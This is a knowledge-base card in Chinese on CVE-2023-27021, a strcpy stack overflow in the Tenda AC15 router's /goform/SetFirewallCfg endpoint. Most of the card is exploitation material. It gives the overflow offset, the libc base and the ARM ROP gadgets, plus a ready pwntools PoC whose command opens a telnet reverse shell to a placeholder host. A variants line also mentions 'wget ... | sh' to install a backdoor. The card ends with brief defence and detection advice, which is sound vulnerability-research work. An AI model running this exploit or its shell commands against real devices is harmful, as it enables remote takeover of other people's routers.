---
id: binary-pwn-stack-tenda-ac15-setfirewallcfg-firewallen-strcpy-arm-rop
title: Tenda AC15 httpd SetFirewallCfg firewallEn strcpy 栈溢出：ARM 偏移 52 + ret2libc 构造 system 命令执行（CVE-2023-27021）
type: scenario
domain: binary
path: binary/pwn/stack
technique: tenda-ac15-httpd-setfirewallcfg-firewallen-strcpy-arm-rop
tags:
- pwn
- stack-overflow
- arm
- router
- firmware
- tenda
- httpd
- rop
- ret2libc
- iot
cve:
- CVE-2023-27021
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
affected_versions: Tenda AC15 V15.03.05.19（US_AC15V1.0BR_V15.03.05.19_multi_TD01，原文复现版本）；CVE 描述涉及 Tenda AC10 US_AC10V4.0si_V16.03.10.13_cn
verification:
  verified_by: verifier-V570
  verified_at: '2026-11-12T09:31:52+08:00'
  notes: 已对照 12949 原文与全部 29 张截图核对：图 01 NVD 页确认 CVE-2023-27021 描述 AC10 US_AC10V4.0si_V16.03.10.13_cn（formSetFirewallCfg），原文在 AC15 V15.03.05.19_multi_TD01 上复现；图 10 反编译显示 websGetVar(firewallEn) 后 strlen>=4 即 strcpy 到 int v3[2]（其相邻为 v4[64]/v5[2]/v6[64]），图 22 cyclic -l 0x6161616e 得偏移 52，图 24 vmmap 确认 <explored> 基址 0xff58c000，图 25/26 确认 0x40cb8 mov r0,sp;blx r3 与 0x18298 pop {r3,pc}，图 27-29 确认 telnet 4444/5555 反弹拿 shell。已修正：一句话结论原写'strcpy 到栈上 64 字节缓冲区'与图 10 不符，改为 int v3[2] 缓冲区。affected_versions 已按原文（AC15 复现版本）与图 01（AC10）set-versions。与 CVE-2018-18708 同设备卡为不同 CVE/接口/偏移，并列保留。未复跑 PoC（文中目标为公网 IP，仅静态核对）。
url: /docs/binary/pwn/stack/binary-pwn-stack-tenda-ac15-setfirewallcfg-firewallen-strcpy-arm-rop/
draft: false
kb_aliases:
- CVE-2023-27021
- formSetFirewallCfg 栈溢出
- firewallEn strcpy
- Tenda AC15 /goform/SetFirewallCfg
- uClibc ret2libc ARM
- 路由器 0day 挖掘
---

## 一句话结论

Tenda AC15（V15.03.05.19）httpd 的 `POST /goform/SetFirewallCfg` 把表单参数 `firewallEn` 经 `websGetVar` 取出后只判断 `strlen >= 4`，直接 `strcpy` 到栈上 `v3`（`int v3[2]`，图 10 反编译）缓冲区，cyclic 实测偏移 52 覆盖返回地址；由于 httpd 为 ARM 32 位、uClibc、仅开 NX（无 PIE/Canary），用 `pop {r3, pc}`（libc 偏移 0x18298）与 `mov r0, sp; blx r3`（0x40cb8）构造 ret2libc，把栈上命令字符串交给 `system`，实测通过 telnet 反弹拿到设备 shell（CVE-2023-27021）。

## 原理

- **Tenda web 框架入口**：httpd 启动时用 `websFormDefine("SetFirewallCfg", formSetFirewallCfg)` 一类注册把 URL 映射到处理函数，`/goform/SetFirewallCfg` 即 `formSetFirewallCfg`；`websGetVar(request, "firewallEn", "1111")` 取表单字段。
- **溢出点**：`formSetFirewallCfg` 内有 `int v3[2]`、`char v4[64]`、`int v5[2]`、`char v6[64]` 等栈变量（图 10 反编译），`s = websGetVar(..., "firewallEn", ...)` 后仅检查 `strlen(s) >= 4`，随后 `strcpy((char *)v3, s)` 无长度上限——超长 `firewallEn` 依次覆盖相邻栈变量与保存的返回地址。
- **偏移计算**：发送 `cyclic(500)` 后 gdb 看到 `PC=0x6161616e`，`cyclic -l 0x6161616e` 得 52，即返回地址前 52 字节在栈帧内。
- **ret2libc 选址**：checksec 显示 `Arch arm-32-little / RELRO No / Stack No canary / NX enabled / PIE No PIE`。栈不可执行（NX），但 httpd 无 PIE 且 uClibc 以固定基址加载；gdb `vmmap` 中 `<explored>` 段 `0xff58c000` 为 libc 映射基址（文中经测试确认），配合 `ELF("./lib/libc.so.0").symbols["system"]` 得 `system_addr = libc_base + system_offset`。
- **Gadget 组合**：
  - `pop {r3, pc}`（libc 偏移 `0x18298`）：从栈上弹出 `system_addr` 到 `r3`，并把下一条（`move_r0`）弹入 `pc`。
  - `mov r0, sp; blx r3`（偏移 `0x40cb8`）：执行时 `sp` 正好指向栈上命令字符串，`mov r0, sp` 令 `r0 = cmd`，`blx r3` 调用 `system(cmd)`。
- **payload 布局**：`cyclic(52) + p32(r3_pop) + p32(system_addr) + p32(move_r0) + cmd`。命令用 `echo test; telnet <ip> 4444 | /bin/sh | telnet <ip> 5555` 形式（路由器通常无 bash，用 telnet 双向管道拿交互 shell）。
- **为什么成立**：httpd 既无栈保护（canary）也无 PIE，且 uClibc 加载基址固定；NX 只是阻止执行栈上 shellcode，不影响复用 libc 中 `system`。qemu-user 模拟环境无 ASLR，基址与真机一致时可复用同一偏移。

## 触发条件

- 目标为受影响的 Tenda AC15 固件（V15.03.05.19 系）且 Web 管理面可达；`/goform/SetFirewallCfg` 可访问（可能需携带有效/可预测的 `password` Cookie）。
- `firewallEn` 长度 ≥4 且可发送任意长度内容。
- 已知或可取得对应固件 `libc.so.0` 的 `system` 偏移与 gadget 偏移；基址来自同固件环境（qemu 模拟或泄漏）。
- 用于漏洞挖掘时：固件可 binwalk 解包并用 qemu-arm-static chroot 模拟 httpd。

## 利用步骤

1. 官网下载固件（`.bin`），`binwalk -Me <fw>.bin --run-as=root` 解出 squashfs-root；`file bin/httpd` 确认 ARM 32-bit LSB、uClibc。
2. 启动模拟：`cp $(which qemu-arm-static) .` 后 `sudo chroot ./ ./qemu-arm-static ./bin/httpd`，建 `webroot` 并复制 `webroot_ro/*` 使页面可访问。
3. IDA 载入 `bin/httpd`，搜索 `strcpy` 的 160 个交叉引用，逐个 F5；定位 `formSetFirewallCfg`（`websGetVar("firewallEn")` 后无长度校验 `strcpy` 到栈）。
4. 核对 `websFormDefine` 中 `"SetFirewallCfg"` → `formSetFirewallCfg`，确认 `POST /goform/SetFirewallCfg` 且参数名 `firewallEn`。
5. 发送 `A*500` 触发崩溃/拒绝服务确认漏洞；`chroot ./ ./qemu-arm-static -g 9999 ./bin/httpd` + `gdb-multiarch ./bin/httpd`（`set architecture arm; target remote :9999`）动态调试。
6. `cyclic(500)` 重发，`cyclic -l $pc` 得偏移 52；`vmmap` 取 libc 基址（`<explored>` 段 0xff58c000）。
7. `ROPgadget --binary ./lib/libc.so.0 --only "pop" | grep r3` 取 `pop {r3, pc}`（0x18298）；`ROPgadget --binary ./lib/libc.so.0 | grep "mov r0, sp"` 取 `mov r0, sp; blx r3`（0x40cb8）。
8. 构造 payload 发送，命令中 telnet 反弹 shell 到监听端并验证回显。

最小化 PoC：

```python
from pwn import *
import requests

url = "http://<target>"
header = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          "Cookie": "password=<有效或可预测Cookie>"}
cmd = b"echo test;telnet <vps> 4444 | /bin/sh | telnet <vps> 5555"

libc_base = 0xff58c000
libc = ELF("./lib/libc.so.0")
system_addr = libc_base + libc.symbols["system"]
r3_pop = libc_base + 0x00018298      # pop {r3, pc}
move_r0 = libc_base + 0x00040cb8     # mov r0, sp; blx r3

payload = cyclic(52) + p32(r3_pop) + p32(system_addr) + p32(move_r0) + cmd
requests.post(url + "/goform/SetFirewallCfg", headers=header, data={"firewallEn": payload})
```

## 变体与关联

- 同设备同类漏洞：Tenda AC15 `setMacFilterCfg` 的 `deviceList` 参数 strcpy 溢出（CVE-2018-18708），偏移 176，gadget 与 libc base 相同（0x18298/0x40cb8、0xff58c000）——同一 httpd、同一利用方法、不同接口/参数。
- Tenda 其他型号（AC7/AC9/AC10/AC18）也有 formSetFirewallCfg 类漏洞（CVE-2023-27021 的 NVD 描述即 AC10 US_AC10V4.0si_V16.03.10.13_cn）。
- 固件模拟（qemu-arm-static chroot、br0 建网桥、webroot 复制、patch 网络等待循环）与 gdb-multiarch/pwndbg 远程调试流程有专门卡；ARM ret2libc 的 gadget 选择随 libc 版本变化，需按实际固件重算。
- 路由器无 bash 时用 telnet 双端口管道反弹；也可 `system("wget ... | sh")` 落地后门。
- 变体：若 libc 加载带 ASLR/未知基址，可先找信息泄漏（puts/printf 输出、`/proc` 读取）再计算；`system` 位于 Thumb 时地址需 `| 1`。

## 检测与防御

- 固件厂商：对 `websGetVar` 取到的所有表单参数做长度/字符白名单校验，用 `strncpy`/`snprintf` 并保证截断与 NUL 结尾；开启 stack canary/PIE 编译加固。
- 设备侧：限制 `goform` 管理接口的来源（仅 LAN/认证后），关闭不必要的防火墙配置接口；WAF/网关对超长 `firewallEn` 等参数告警。
- 检测：分析 httpd 中 `strcpy` 交叉引用与 `websFormDefine` 注册表；动态用超长参数测试崩溃；监控设备异常 telnet 外连与 core dump 文件。
